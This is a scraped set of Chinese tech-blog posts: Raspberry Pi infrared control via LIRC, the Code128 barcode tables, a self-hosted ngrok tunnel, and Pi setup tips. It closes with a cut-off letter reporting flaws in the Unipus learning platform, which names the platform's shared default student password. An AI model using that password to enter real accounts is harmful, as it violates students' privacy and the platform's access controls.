Echoes\n\n\ncymatics是使声音形象化的过程，基本上借由沙或水等媒介的振动来达成。——百度百科\n\n这才是电音该有的样子\n旋律和节奏穿过物理的障碍\n透过波形和几何\n把宇宙和神的秘密射给你\n直达肉眼凡胎\n这是音乐的神祇\n源自心灵的电波\n和他人无关\n原点即是本我的自己\nMV外链：http://music.163.com/#/mv?id=375405\n"},{"title":"树莓派(一代B+版)+红外收发管+智能小车——实现小车远程控制","url":"/2017/06/30/%E6%A0%91%E8%8E%93%E6%B4%BE(%E4%B8%80%E4%BB%A3B+%E7%89%88)+%E7%BA%A2%E5%A4%96%E6%94%B6%E5%8F%91%E7%AE%A1+%E6%99%BA%E8%83%BD%E5%B0%8F%E8%BD%A6%E2%80%94%E2%80%94%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%BD%A6%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/","content":"前段时间的，新生工程体验课上，两人一组，靠厂家提供的元器件和烧录代码，焊接了了一台智能小车。\n最进，碰巧手头有空闲的一块树莓派，本来打算用树莓派去实现远程控制空调，但发现空调的红外编码带有逻辑控制，只能退而求其次，试试远程控制小车，大体框架结构如图。\n\n2017-07-03更新，已经实现对空调类带逻辑编码设备的简单控制。\n\n\n烧录系统\n几乎所有的新手教程都使用Win32DiskImager作为系统安装工具——中文的、英文的、官方的、eLinux\nwiki的，不一而足。\n但是这个工具不支持中文目录名（文件或目录有中文，会出现123错误），不支持压缩，必须先插好SD卡，再开软件。\n而USB\nImage Tool，就是Win32DiskImager的一个更方便的替代品。\n\n写SD卡：直接读取zip压缩包\nUSB Image\nTool可以直读.zip压缩包。网上下载的zip格式系统镜像，下完直接可以烧录。\n点击Restore，选择.zip文件即可。注意打开对话框中默认看不到.zip文件，在“文件类型”处选择“All\nFiles (.)”即可。\nSSH无法连接问题\n自从2016年11月开始，树莓派官方推荐 Raspbian\n系统镜像关闭了默认ssh连接，重新开启也很简单，把SD卡拔下来，进入到根目录，新建一个名为ssh的空白文件(无后缀)就可以。\n好了然后再把卡插回树莓派，就可以使用SSH了。\n\n初始用户名：pi\n初始密码：raspberry\n\n将红外接受管和发射管连接至树莓派GPIO接口\n材料：\n红外接受管（3pin），红外接受管（2pin）,杜邦线若干。\n根据不同树莓派版本，查看GPIO的引线图，该实验采用B+版，具体实物对应图和GPIO与pin对应图如下图：\n\n\n硬件连接\n红外接收器\n\nvcc 连 pin1 (3.3v)\ngnd 连 pin6(ground)\ndata 连 pin12(gpio18)\n\n红外发射器\n\ngnd 连 pin25(ground)\ndata 连 pin11(gpio17)\n\n红外接受器规格见图，左引脚为data，中为接地，右为3.3V供电\n\n红外发射器规格见图，长脚为data,短脚为接地\n\n接收器和发射器通过杜邦线跟树莓派相连，最后的连接实物图\n\n预先解析控制码\n修改 raspbian 仓库默认源\n\n修改apt源\n\nsudo nano /etc/apt/sources.list\n例如使用大连东软信息学院软件源镜像，修改之后的内容如下：\ndeb http://mirrors.aliyun.com/raspbian/raspbian jessie main contrib non-free rpi\n其他可用源如下：\n\n中国科学技术大学 Raspbian http://mirrors.ustc.edu.cn/raspbian/raspbian/\n阿里云 Raspbian http://mirrors.aliyun.com/raspbian/raspbian/\n清华大学 Raspbian http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/\n华中科技大学 Raspbian http://mirrors.hustunique.com/raspbian/raspbian/ Arch\nLinux ARM http://mirrors.hustunique.com/archlinuxarm/\n华南农业大学（华南用户） Raspbian http://mirrors.scau.edu.cn/raspbian/\n大连东软信息学院源（北方用户） Raspbian http://mirrors.neusoft.edu.cn/raspbian/raspbian/\n重庆大学源（中西部用户）\nRaspbian http://mirrors.cqu.edu.cn/Raspbian/raspbian/\n\n\n更新软件源和软件\n\n# 更新软件源sudo apt-get update# 更新软件sudo apt-get upgrade\n更换vi文本编译器为vim\n因为vi在insert模式下，方向键会变为ABCD，故用vim进行替换\n#卸载visudo apt-get remove vi-common#安装vimsudo apt-get install -y vim\n安装lirc\nLIRC (Linux Infrared remote\ncontrol)是一个linux系统下开源的软件包。这个软件可以让Linux系统接收及发送红外线信号。\nsudo apt-get install lirc\n配置硬件\n# sudo vim /boot/config.txt #在文件结尾添加# 修改一下内容dtoverlay=lirc-rpigpio_in_pin=18gpio_out_pin=17# sudo vim /etc/lirc/hardware.conf  #编辑LRIC的配置文件# 修改以下内容LIRCD_ARGS=&quot;--uinput&quot;DRIVER=&quot;default&quot;DEVICE=&quot;/dev/lirc0&quot;MODULES=&quot;lirc_rpi&quot;# 重启生效sudo /etc/init.d/lirc restart\n注意：配置gpio_in_pin和gpio_out_pin时，编号为GPIO号，并非pin号\n启动测试\nsudo mode2 -d /dev/lirc0\n红外接收器已经打开，处于监听状态。这个时候，利用任何红外发射器（可以是电视遥控器或其他遥控器）对红外接收模块按任意按钮，就可以在树莓派终端上看到类似如下的代码\n看到这个代码便证明红外接收模块是正常工作的。\n如果没有看到，请检查你的接线、电压、以及通过lsusb查看是否加载了相应模块。\npulse 1681space 4816pulse 1695space 4784pulse 1333space 3638\n录制解析控制码\n\n开始录制\n\nirrecord -d /dev/lirc0 ~/lircd.conf #按照提示操作即可,录制完后会让你输入按键名\n\n查看可用键名列表\n\nirrecord --list-namespace\n\n将已录制的编码加载进 lirc 配置参数\n\nsudo cp ~/lircd.conf /etc/lirc/lircd.conf\n通过树莓派发射红外编码\n\n启动lircd服务\n\nsudo lircd -d /dev/lirc0\n\n查看录制好可以使用的键名\n\nirsend LIST /home/pi/lircd.conf &quot;&quot;\n\n发送红外编码\n\nirsend SEND_ONCE /home/pi/lircd.conf KEY_XXX\n演示效果\n\n\n\n关于录制带逻辑编码的红外编码\n一个比较令人兴奋的消息，谢谢博客http://blog.just4fun.site/raspberrypi-lirc.html的帮助，直接发送raw原始码就可以实现简单的控制程序。😘\n注意：其只能使用raw原始码，记录是通过mode2命令实现。\n\n制作模版（不设置按键，初始化玩直接跳过）\n\nsudo /etc/init.d/lirc restartirrecord  -f -d /dev/lirc0 ~/lircd.conf\n\n录制需要实现的按键\n\nmode2  -d /dev/lirc0 &gt; /tmp/temp.code  cat /tmp/temp.code | sed -n &#x27;2,$p&#x27; | grep -o  -E &quot;[0-9]+&quot; | xargs echo  # 移除第一行,之后把所有数字取出# 把上述指令写入 ~/lircd.conf 的 KEY_OPEN里# 值得注意的是 ~/lircd.conf文件里的空格十分重要sudo cp ~/lircd.conf /etc/lirc/lircd.confsudo /etc/init.d/lirc restart# irsend LIST /home/pi/lircd.conf &quot;&quot; #列出指令\n\n最后一个参考格式的lircd.conf文件（保证空格正确）\n\nbegin remote  name  /home/pi/lircd.conf  flags RAW_CODES  eps            30  aeps          100  gap          8015      begin raw_codes          name KEY_POWER               8927 4522 531 1711 551 1706 559 598 549 599 551 600 551 598 551 597 552 1719 558 597 549 1715 549 1724 540 614 535 592 559 597 550 599 551 610 551 602 549 598 553 1706 558 598 549 601 549 599 550 601 548 614 551 593 557 1717 545 598 551 598 552 598 552 599 549 598 553 1720 556 597 563 589 549 600 549 601 549 607 545 593 555 599 551 614 548 598 551 598 551 600 550 594 604 548 555 597 551 599 551 597 573 7967 558 597 549 598 548 603 548 601 554 598 550 599 550 600 545 619 549 600 545 599 556 598 551 600 549 611 541 597 551 599 551 609 548 601 555 598 552 596 554 598 550 598 563 587 551 600 543 615 556 598 550 598 551 599 576 574 552 596 552 598 552 613 538 612 551 595 552 597 553 598 552 599 552 596 552 1720 545 596 552 610 551 599 551 599 575 575 551 593 559 595 553 598 552 598 549 612 552 598 551 1705 559 597 574 1689 550 1724 540 598 552 592 559 609 553 599 548 598 552 1711 551 1705 560 1708 553 1711 550 599 553 1716 563 7970 559 597 551 600 573 578 550 599 551 600 575 573 565 589 575 586 552 1710 554 597 556 596 553 597 549 604 552 600 550 599 551 614 551 598 552 599 552 599 548 602 553 598 550 1713 552 599 552 613 593 558 545 604 564 586 552 598 552 598 554 595 554 601 546 617 546 607 550 597 551 611 541 597 553 598 553 598 580 572 548 615 552 599 554 596 552 599 551 598 554 598 547 614 536 604 552 609 554 1714 548 598 556 597 548 599 553 601 553 1711 553 598 553 593 549      end raw_codesend remote\n\n启动服务，运行指令\n\nsudo lircd -d /dev/lirc0irsend SEND_ONCE /home/pi/lircd.conf KEY_POWER\n"},{"title":"条形码code128编码规则","url":"/2019/04/08/%E6%9D%A1%E5%BD%A2%E7%A0%81code128%E7%BC%96%E7%A0%81%E8%A7%84%E5%88%99/","content":"\n条形码或称条码（barcode）是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。条形码可以标出物品的生产国、制造厂家、商品名称、生产日期、图书分类号、邮件起止地点、类别、日期等信息，因而在商品流通、图书管理、邮政管理、银行系统等许多领域都得到了广泛的应用。\n\n条形码分类\n条形码按类型可分为：线性条形码和矩阵（二维）条形码\ncode128编码\nCode 128是ISO/IEC 15417:2007[1]定义的条形码规范。\nCode\n128条码可以对全部128个ASCII字符（包括数字、大小写字母、符号和控制符）进行编码。\ncode128码是广泛应用在企业内部管理、生产流程、物流控制系统方面的条码码制，由于其优良的特性在管理信息系统的设计中被广泛使用，CODE128码是应用最广泛的线性条形码制之一。\ncode128编码分类\n\ncode128\nA字符集：包括大写字母、数字、常用标点符号和一些控制符。\ncode128B\n字符集：包括大小写字母、数字、常用标点符号。\ncode128C 字符集： 为纯数字序列。\ncode128Auto：是将上述三种字符集最佳优化组合。\n\ncode128编码构成\n一个Code 128条形码由六部分组成。\n\n空白区域\n起始标记\n数据区\n校验符\n终止符\n空白区域\n\ncode128编码表\n\n\n\nID\nCode128A\nCode128B\nCode128C\nBandCode\n图案\n\n\n\n\n0\nSP\nSP\n0\n212222\n11011001100\n\n\n1\n!\n!\n1\n222122\n11001101100\n\n\n2\n“\n“\n2\n222221\n11001100110\n\n\n3\n#\n#\n3\n121223\n10010011000\n\n\n4\n$\n$\n4\n121322\n10010001100\n\n\n5\n%\n%\n5\n131222\n10001001100\n\n\n6\n&amp;\n&amp;\n6\n122213\n10011001000\n\n\n7\n‘\n‘\n7\n122312\n10011000100\n\n\n8\n(\n(\n8\n132212\n10001100100\n\n\n9\n)\n)\n9\n221213\n11001001000\n\n\n10\n*\n*\n10\n221312\n11001000100\n\n\n11\n+\n+\n11\n231212\n11000100100\n\n\n12\n,\n,\n12\n112232\n10110011100\n\n\n13\n-\n-\n13\n122132\n10011011100\n\n\n14\n.\n.\n14\n122231\n10011001110\n\n\n15\n/\n/\n15\n113222\n10111001100\n\n\n16\n0\n0\n16\n123122\n10011101100\n\n\n17\n1\n1\n17\n123221\n10011100110\n\n\n18\n2\n2\n18\n223211\n11001110010\n\n\n19\n3\n3\n19\n221132\n11001011100\n\n\n20\n4\n4\n20\n221231\n11001001110\n\n\n21\n5\n5\n21\n213212\n11011100100\n\n\n22\n6\n6\n22\n223112\n11001110100\n\n\n23\n7\n7\n23\n312131\n11101101110\n\n\n24\n8\n8\n24\n311222\n11101001100\n\n\n25\n9\n9\n25\n321122\n11100101100\n\n\n26\n:\n:\n26\n321221\n11100100110\n\n\n27\n;\n;\n27\n312212\n11101100100\n\n\n28\n&lt;\n&lt;\n28\n322112\n11100110100\n\n\n29\n=\n=\n29\n322211\n11100110010\n\n\n30\n&gt;\n&gt;\n30\n212123\n11011011000\n\n\n31\n?\n?\n31\n212321\n11011000110\n\n\n32\n@\n@\n32\n232121\n11000110110\n\n\n33\nA\nA\n33\n111323\n10100011000\n\n\n34\nB\nB\n34\n131123\n10001011000\n\n\n35\nC\nC\n35\n131321\n10001000110\n\n\n36\nD\nD\n36\n112313\n10110001000\n\n\n37\nE\nE\n37\n132113\n10001101000\n\n\n38\nF\nF\n38\n132311\n10001100010\n\n\n39\nG\nG\n39\n211313\n11010001000\n\n\n40\nH\nH\n40\n231113\n11000101000\n\n\n41\nI\nI\n41\n231311\n11000100010\n\n\n42\nJ\nJ\n42\n112133\n10110111000\n\n\n43\nK\nK\n43\n112331\n10110001110\n\n\n44\nL\nL\n44\n132131\n10001101110\n\n\n45\nM\nM\n45\n113123\n10111011000\n\n\n46\nN\nN\n46\n113321\n10111000110\n\n\n47\nO\nO\n47\n133121\n10001110110\n\n\n48\nP\nP\n48\n313121\n11101110110\n\n\n49\nQ\nQ\n49\n211331\n11010001110\n\n\n50\nR\nR\n50\n231131\n11000101110\n\n\n51\nS\nS\n51\n213113\n11011101000\n\n\n52\nT\nT\n52\n213311\n11011100010\n\n\n53\nU\nU\n53\n213131\n11011101110\n\n\n54\nV\nV\n54\n311123\n11101011000\n\n\n55\nW\nW\n55\n311321\n11101000110\n\n\n56\nX\nX\n56\n331121\n11100010110\n\n\n57\nY\nY\n57\n312113\n11101101000\n\n\n58\nZ\nZ\n58\n312311\n11101100010\n\n\n59\n[\n[\n59\n332111\n11100011010\n\n\n60\n\\\n\\\n60\n314111\n11101111010\n\n\n61\n]\n]\n61\n221411\n11001000010\n\n\n62\n^\n^\n62\n431111\n11110001010\n\n\n63\n_\n_\n63\n111224\n10100110000\n\n\n64\nNUL\n`\n64\n111422\n10100001100\n\n\n65\nSOH\na\n65\n121124\n10010110000\n\n\n66\nSTX\nb\n66\n121421\n10010000110\n\n\n67\nETX\nc\n67\n141122\n10000101100\n\n\n68\nEOT\nd\n68\n141221\n10000100110\n\n\n69\nENQ\ne\n69\n112214\n10110010000\n\n\n70\nACK\nf\n70\n112412\n10110000100\n\n\n71\nBEL\ng\n71\n122114\n10011010000\n\n\n72\nBS\nh\n72\n122411\n10011000010\n\n\n73\nHT\ni\n73\n142112\n10000110100\n\n\n74\nLF\nj\n74\n142211\n10000110010\n\n\n75\nVT\nk\n75\n241211\n11000010010\n\n\n76\nFF\nI\n76\n221114\n11001010000\n\n\n77\nCR\nm\n77\n413111\n11110111010\n\n\n78\nSO\nn\n78\n241112\n11000010100\n\n\n79\nSI\no\n79\n134111\n10001111010\n\n\n80\nDLE\np\n80\n111242\n10100111100\n\n\n81\nDC1\nq\n81\n121142\n10010111100\n\n\n82\nDC2\nr\n82\n121241\n10010011110\n\n\n83\nDC3\ns\n83\n114212\n10111100100\n\n\n84\nDC4\nt\n84\n124112\n10011110100\n\n\n85\nNAK\nu\n85\n124211\n10011110010\n\n\n86\nSYN\nv\n86\n411212\n11110100100\n\n\n87\nETB\nw\n87\n421112\n11110010100\n\n\n88\nCAN\nx\n88\n421211\n11110010010\n\n\n89\nEM\ny\n89\n212141\n11011011110\n\n\n90\nSUB\nz\n90\n214121\n11011110110\n\n\n91\nESC\n{\n91\n412121\n11110110110\n\n\n92\nFS\n|\n92\n111143\n10101111000\n\n\n93\nGS\n}\n93\n111341\n10100011110\n\n\n94\nRS\n~\n94\n131141\n10001011110\n\n\n95\nUS\nDEL\n95\n114113\n10111101000\n\n\n96\nFNC3\nFNC3\n96\n114311\n10111100010\n\n\n97\nFNC2\nFNC2\n97\n411113\n11110101000\n\n\n98\nSHIFT\nSHIFT\n98\n411311\n11110100010\n\n\n99\nCODEC\nCODEC\n99\n113141\n10111011110\n\n\n100\nCODEB\nFNC4\nCODEB\n114131\n10111101110\n\n\n101\nFNC4\nCODEA\nCODEA\n311141\n11101011110\n\n\n102\nFNC1\nFNC1\nFNC1\n411131\n11110101110\n\n\n103\nStartA\nStartA\nStartA\n211412\n11010000100\n\n\n104\nStartB\nStartB\nStartB\n211214\n11010010000\n\n\n105\nStartC\nStartC\nStartC\n211232\n11010011100\n\n\n106\nStop\nStop\nStop\n2331112\n1100011101011\n\n\n\ncode128检验位计算\n（开始位对应的ID值 ＋\n每位数据在整个数据中的位置×每位数据对应的ID值）% 103\nCode128编码示例\n\n以 PZ1704946715\n为例，开始为code128A，开始位对应的ID为103，第1位数据P对应的ID为48，第2位数据Z对应的ID为58，依此类推，可以计算。\n检验位 = (103 + 1 * 48 + 2 * 58 + 3 * 17 + 4 * 23 + 5 * 16 + 6 * 20\n+7 * 25 + 8 * 20 + 9 * 22 + 10 * 23 + 11 * 17 + 12 * 21) % 103 = 61​\n即检验位的ID为61。\n对照编码表，PZ1704946715 编码表示为：开始位Start Code\nA（11010000100）＋ 数据位［P（11101110110）＋\nZ（11101100010）＋1（10011100110）＋ 7（11101101110）＋\n0（10011101100）＋ 4（11001001110）＋ 9（11100101100）＋\n4（11001001110）＋ 6（11001110100）＋ 7（11101101110）＋\n1（10011100110）＋ 5（11011100100）］＋ 检验位61（11001000010）＋\n结束位Stop（1100011101011）\n若要打印，只需将1用黑色线标出，0用白色线标出，就完成一个简单的条形码生成。\n"},{"title":"自搭建Ngrok内网穿透服务+https(ssl)认证+ssh通道","url":"/2018/07/30/%E8%87%AA%E6%90%AD%E5%BB%BANgrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%9C%8D%E5%8A%A1+https(ssl)%E8%AE%A4%E8%AF%81+ssh%E9%80%9A%E9%81%93/","content":"\n背景\n\n最近在开发一款微信小程序，实现学校教务管理的信息（成绩、课表等）的抓取与发布。\n教务系统服务器处于校内网的环境，在外网下，有且仅有通过vpn账号和学校内部服务器通信。\n\n要实现小程序查询功能，有以下两种方式\n\n查询服务器完全部署在云端，通过vpn账号与学校联通;\n查询服务器部署在内网环境下，通过内网穿透的方式，与云端的代理连通。\n\n一般来说，vpn账号关乎个人隐私，与网络费用挂钩。此次小程序的开发，我希望遵循“简化、安全”的宗旨，希望借助ngrok内网穿透服务，来代理网络的https请求，转发到内网的服务器上。\n安装GO环境\n网络服务器的环境为ubuntu 18.04 x64，借助apt包直接安装\nsudo apt install build-essential golang openssl\n\n查看go语言版本\n\ngo version\n下载ngrok源码\n当前最新的ngrok版本为2.x，但是最新的2.x版本不开源，仅提供1.x可用。且ngrok分服务端和用户端两部分，一般来说，云端服务器做服务端，内网服务端做用户端，且编译依赖于SSL证书，相当于仅仅能一对一使用。\ngit clone https://github.com/inconshreveable/ngrok.gitcd ngrok\n配置私有SSL证书信息\n\n注意：使用私有的SSL证书，并不会被浏览器/微信小程序开发承认。小程序要求所有request要求必须是经过https加密传输，并且安全SSL证书认证的。当前https认证第三方组织的少有免费的。\n\nNGROK_DOMAIN=&quot;btbuquery.top&quot;    #注意域名换成你自己的openssl genrsa -out base.key 2048openssl req -new -x509 -nodes -key base.key -days 10000 -subj &quot;/CN=$NGROK_DOMAIN&quot; -out base.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj &quot;/CN=$NGROK_DOMAIN&quot; -out server.csropenssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days 10000 -out server.crt    #将生成的证书文件拷贝到指定位置，替代默认证书cp base.pem assets/client/tls/ngrokroot.crtcp server.crt assets/server/tls/snakeoil.crtcp server.key assets/server/tls/snakeoil.key\n使用阿里云免费的SSL一年认证\n来自由DigiCert Inc公司提供了一年时长的免费SSL认证，因为在编译依赖SSL证书\n\n从阿里云下载到认证的证书\n\n共四个文件，将第二个后缀重命名为xxxxxxxxxxx.crt，传到ngrok的目录下\n\n复制到assets/server/tls/文件夹下\ncp *.crt assets/server/tls/snakeoil.crtcp *.key assets/server/tls/snakeoil.key\n编译服务端ngrokd\n# 编译64位linux平台服务端GOOS=linux GOARCH=amd64 make release-server# 编译64位windows客户端GOOS=windows GOARCH=amd64 make release-server# 编译是64位mac客户端GOOS=darwin GOARCH=amd64 make release-server# 如果是32位，GOARCH=386\n\n关于arm的编译\n\nGOOS=linux GOARCH=arm make release-server\n编译客户端ngrok\n按照平台需求，设置不同参数，与编译服务端一致。\nmake release-client\n执行后会在ngrok/bin目录及其子目录下看到服务端ngrokd和客户端ngrok二进制可执行文件\n运行服务端ngrokd\ncd bin/sudo ./ngrokd -domain=&quot;btbuquery.top&quot; -httpAddr=&quot;:80&quot; -httpsAddr=&quot;:443&quot; -tunnelAddr=&quot;:4443&quot;\nhttpAddr：设置代理的http端口，默认80;\nhttpsAddr：设置代理的https端口，默认443;\ntunnelAddr：设置ngrok通信端口，默认4443。\n运行客户端ngrok\n将云服务器上的ngrok/bin/ngrok文件传输到在内网服务器上，以在ngrok文件下为例：\n\n新建一ngrok.cfg文件，写入以下内容\n\n\nhttp代理：设置子域名(以www为例)，本地端口（以8000为例）\nssh代理：远程端口22\n\nserver_addr: btbuquery.top:4443trust_host_root_certs: true # 需要第三方SSL认证inspect_addr: 0.0.0.0:4040tunnels:  http:    proto:      http: 8000    subdomain: &quot;www&quot;  https:    proto:      https: 8000    subdomain: &quot;www&quot;  ssh:    remote_port: 222    proto:      tcp: 22\n\n注意：若使用私有SSL认证，必须设置trust_host_root_certs为false\n\n\n运行客户端\n\n./ngrok -log=ngrok.log -config=ngrok.cfg start http ssh\n相当于实现 http://www.btbuquery.top 转发到内网\n127.0.0.1:8000 https://www.btbuquery.top\n转发到内网 127.0.0.1:8000\ntcp://btbuquery.top:222 转发到内网\n120.0.0.1:222\n服务端加入系统启动服务\n\n在ngrok文件下新建start.sh脚本，写入以下内容\n\n/root/project/ngrok/bin/ngrokd -domain=&quot;btbuquery.top&quot; -httpAddr=&quot;:80&quot; -httpsAddr=&quot;:443&quot; -tunnelAddr=&quot;:4443&quot;\n\n在/etc/init.d新建ngrok文件，写入以下内容\n\n#!/bin/sh### BEGIN INIT INFO# Provides:          ngrok# Required-Start:    # Required-Stop:     # Default-Start:     2 3 4 5# Default-Stop:      0 1 6# Short-Description: Start or stop the ngrok Proxy.### END INIT INFOngrok_path=/root/project/ngrok  #指定ngrok文件夹case &quot;$1&quot; in        start)                echo &quot;start ngrok service..&quot;                sh $&#123;ngrok_path&#125;/start.sh                ;;        *)        exit 1        ;;esac\n\n加入开机启动\n\ncd /etc/init.d/sudo chmod 755 ngroksudo update-rc.d ngrok defaults 90\n"},{"title":"树莓派做智能小车环境配置","url":"/2017/08/23/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E6%99%BA%E8%83%BD%E5%B0%8F%E8%BD%A6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","content":"\n暑假里，留校了基本50天，在机器人比赛上，参加了南京的旅游机器人比赛和山东的全国机器人比赛。但实在有些后悔，并没有拿到特别好的成绩。反思起来，一部分是因为自己没有用心参与团队的比赛，另一方面，我们可能过多依赖于别人的技术。\n这段时间，思前想后，发现：我们虽然用学校经费大价钱购置了几台往年的车型，但底层的核心代码全部掌握在别人手中。这一点导致我们接手后能做的工作只是在大框架下进行代码调试，使其适应比赛规则及场地的要求，但无法做出创新的更改。最终，还是决定做一个一台自组装的智能小车，并希望用小车来参加明年的比赛。\n小车采用树莓派3做总控，并通过各种扩展模块对电机，传感器进行控制。具体的方案我会写在将来的文章中，在此，仅写下环境配置方案，以备份用于不时之需。\n硬件选择与介绍\n作为一个机器人项目，用作中控的芯片选择很多:\n\n基于AVR的arduino系\nstm32系\narm系\nfpga系\n……\n\n其中fpga开发难度极大，且价格较贵，一般用作飞控，这里不做考虑；而在我所想的方案中，希望能够做到较容易的开发且需要一定量的计算能力，arduino和stm32一般产品的时钟频率都比较偏低，难以应对图像处理，且stm32需要从底层开发，难度较大；而在arm系中树莓派成为一个极佳的选择。\n树莓派至今（2017年98月），已出3代产品，每代产品又分为A、B两型。A型一般用于企业，公司定制，无各种外接接口，需要额外焊接；B型为对外出售型号，有各式各样的IO接口，包括USB，HDMI，3.5mm音频接口，lan接口，以及专用的摄像头输入和视频输出接口。\n而最主要的，是其包含40pin的gpio，这一点足够用于机器人开发。除此外，B型还有后期的B+型号，是对B型的性能的较低提升。就性能而言，不像arduino和stm32孱弱的性能（一般低于50mHz），树莓派是一台完整的计算机，soc为博通研发，现在最新第三代产品raspberrypi3\nB，其cpu采用4核1.2G，足够用以图像处理，甚至跑一些简单的神经网络模型。\n具体详细的各版本硬件介绍，可以参阅树莓派百度百科。\n系统安装\nraspberrypi官方系统安装\n树莓派官方官网：https://www.raspberrypi.org/downloads/\n\n分为NOOBS版本和RASPBIAN版，NOOBS内置了RASPBIAN但多了一个启动界面（相当于BIOS），在安装时可以通过网络选择其他的系统，我们一般若安装官网系统直接下载RASPBIAN版，就好。\n\n下载后，解压会得到一个img后缀的文件，这就是已打包的系统镜像；\nsd插入电脑（可用读卡器），格式化sd卡；\n下载win32diskimager，用于写入镜像；\n选择已解压的镜像文件，并选择sd卡盘符（默认已选），最后点Write\n即可完成写入；\nsd插入树莓派，接入hdmi线，通电自动开机。\n\n第三方系统安装：ubuntu mate\n因为linux一直在用Ubuntu的发行版，所以在本次配置中拟采用ubuntu\nmate作为系统环境，针对树莓派的ubuntu\nmate下载地址，和2.1系统安装一样，解压得到img文件，win32diskimager写入，开机。\n基础环境配置\nvim编译器\nvim编译器一直我都比较喜欢，但逻辑不同于一般win平台的编译器（例如notepad++），需要一定的时间练习。在官方系统可能存在vim编译器为common版，在编辑时存在方向键无法使用的问题，通过以下命名即可更换：\nsudo apt-get remove vim-commonsudo apt-get install vim\n中文输入法\n\nraspbian版中，系统默认英文，且没有中文字库，我们需先安装简体字体\n\nsudo apt-get install ttf-wqy-zenhei\n\n再通过 raspi-config进入参数选择；\n然后选择change_locale；\n在Default locale for the system\nenvironment中选择zh-CN\nUTF-8(空格键选择)；\n然后然后按回车，然后默认语言选中zh-cn然后回车；\n重启机器，就发现整个环境变成中文的了。\n\n\nubuntu\nmate系统安装时，可以自主选择语言，不存在字体问题。在系统中，我们采用google拼音输入法作为中文输入法，注意这里采用fcitx作为输入法框架，类似框架还用ibus。\n\nsudo apt-get install fcitx fcitx-googlepinyin\n在raspbian中，我们采用ibus输入法作为中文输入法\nsudo apt-get install ibus ibus-pinyin\n更新源更改\n因为墙的原因，国内访问树莓派的更新源都比较慢，甚至出现404情况，因此我建议把源换回国内\n\nraspbian系统的国内源比较多，这里我们采用阿里云的源\n\nsudo nano /etc/apt/sources.list #编辑源#  把所有内容替换为以下内容，保存并退出deb http://mirrors.aliyun.com/raspbian/raspbian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/raspbian/raspbian/ stretch main non-free contrib\n最后，更新源，会看见明显下载速度的提升\nsudo apt-get updatesudo apt-get upgrade\n\nubuntu\nmate的源相对较少，国内我现在只找到一家，是中科大的源。具体操作也是\n\nsudo vim /etc/apt/sources.list #编辑源# 然后把其中的 http://ports.ubuntu.com/  换为 http://mirrors.ustc.edu.cn/ubuntu-ports/ \n最后，同样命令更新源\nsudo apt-get updatesudo apt-get upgrade\npip源更改\npip源也存在连接过慢的问题，pip源更改也比较简单，\n对Linu系统：首先进用户主文件，建立个.pip文件夹（注意有个点），再在.pip文件下建立pip.conf文件。\ncd ~/sudo mkdir .pipcd .pipsudo vim pip.conf\n写入以下内容，详情见http://mirrors.aliyun.com/help/pypi\n[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com\n远程设置\n远程连接一般采用两种方式ssh和远程桌面\n\nSSH：\n\nraspbian版可通过raspi-config设置ssh开启，或在存储卡根目录新建一个ssh空文件\nubuntu mate版默认开启ssh\n\n远程桌面：远程桌面有多个选择，vnc，xrdp等，我们建议使用xrdp，可以免于繁琐的配置。但在raspbian版中已经集成了vnc,可以通过raspi-config开启\n\nsudo apt-get install xrdp\n文件共享\n文件共享能实现局域网内windows与树莓派的文件共享。\n\n首先要保证windows网络发现功能开启，树莓派上采用samba作为共享工具\nsudo apt-get install samba samba-common-bin \t# 安装sambasudo vim /etc/samba/smb.conf \t# 修改配置文件\n在文本末端加入以下内容（以共享主文件下 公共的\n文件夹为例）\n[共享目录]    comment = this is Linux share directory     path = ~/公共的     public = yes     writable = yes     browseable = yes     available = yes\n再重启samba服务\nsudo /etc/init.d/samba restart\n在Samba配置文件设置过权限后，还需要在系统中将共享文件夹的权限设置为同配置文件中相同的权限，这样才能确保其他用户正常访问及修改文件夹内容\nsudo chmod -r 777 ~/公共的/\n\n应该就能在windows的网络位置发现树莓派设备了。\n开发环境配置\nopenCV3.2 编译安装\n关于3.2版的openCV我已经写在我的另一篇文章ubuntu17.04环境下opencv3.2.0配置，基本同样的步骤，只是在make的时候，树莓派的计算能力较弱，且发热量较大，如果没有主动散热，建议\nsudo make -j2 #两个线程编译\n当然，若有额外的散热工具，也可以用：\nsudo make -j4  #四线程加快编译\ntensorflow 安装\ntensorflow作为Google开源的计算机深度学习库，可以极大简化深度学习的代码。\ngithub上已经有人针对树莓派做好了移植代码，致敬！链接\n注意：现在的所支持tensorflow最高版本为1.2.0，所支持的python版本为2.7和3.4，一般的树莓派系统都是3.5，这一点可以通过docker解决。\n具体步骤不再赘述，请移步github查看。\n"},{"title":"视听说在线平台（Unipus）网页漏洞的提交","url":"/2017/09/19/%E8%A7%86%E5%90%AC%E8%AF%B4%E5%9C%A8%E7%BA%BF%E5%B9%B3%E5%8F%B0%EF%BC%88Unipus%EF%BC%89%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8F%90%E4%BA%A4/","content":"\n\n——致北京工商大学外国语学院的一封信\n\n北京工商大学向来致力为各位学生提供一个优质，公平的教育环境，为培养学生成为各方面并同发展的未来国家栋梁人才而全力以赴。在英语学习方面，学校尤为重视，特设定英语四级考试通过为毕业条件；同时为四、六级成绩优异考生提供奖金支持。因此，在平时课堂练习时，学校采用了《新标准大学英语》系列教材，该教材配套的《视听说教程》为一个优秀的在线教育平台，为同学们提供了口语练习，写作练习，填空，选择题等多种多样的强化学习方式。\n​\n但人无完人，再好的平台也有其欠缺的一面。近日，我在使用《视听说3》时，运用对网页源码解析的方式，发现以下问题：\n\n登录密码全部采用默认密码nhce111\n\n该情况是多年的一个问题，我承认，设置默认密码，便于教室端对学生学习进度以及学习成绩进行掌握。该问题为同学间互相查看答案提供了一个途径，也为我接下来发现的一个更为严重的问题提